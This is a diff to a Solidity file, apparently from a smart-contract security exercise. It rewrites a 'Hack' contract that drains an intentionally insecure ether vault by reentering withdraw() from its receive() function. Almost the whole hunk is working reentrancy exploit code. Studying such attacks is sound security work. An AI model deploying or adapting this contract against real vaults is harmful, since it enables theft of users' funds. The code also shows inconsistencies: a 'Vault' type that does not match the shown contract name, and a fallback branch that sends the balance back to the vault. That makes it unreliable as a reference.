@@ -33,27 +33,31 @@ contract C_02_InsecureEtherVault {
 }
 
 contract Hack {
-    function deposit(C_02_InsecureEtherVault _vault) external payable {
+
+    Vault public immutable vault;
+
+    constructor(Vault _vault) {
+        vault = _vault;
+    }
+
+    function deposit() external payable {
         // call .deposit to deposit to the vault
-        _vault.deposit{value: msg.value}();
-        
-        // call .widthdraw to widthdraw all the balance => trigger the .call interaction @19
+        vault.deposit{value: msg.value}();
+    }
+    
+    function attack() external {
         // @notice .call interaction with empty data will invoke the receice() function @45 => trigger the draning logic
-        _vault.widthraw(msg.value);
+        uint amount = vault.balances(address(this));
+        vault.withdraw(amount);
     }
 
     receive() external payable{
-        // initialize the vault again
-        C_02_InsecureEtherVault vault = C_02_InsecureEtherVault(msg.sender);
-        
-        // get the balance of the address
-        uint balance = vault.balances(address(this));
-        
         // @notice as in the `.call` interaction in `C_02_InsecureEtherVault.widthdraw()` happens before updating the state
         // => this condition down bellow is always true
-        if (msg.sender.balance >= balance) {
-            vault.widthraw(balance);
+        if (address(vault).balance >= msg.value) {
+            vault.withdraw(msg.value);
+        } else {
+            payable(msg.sender).transfer(address(this).balance);
         }
     }
-
 }
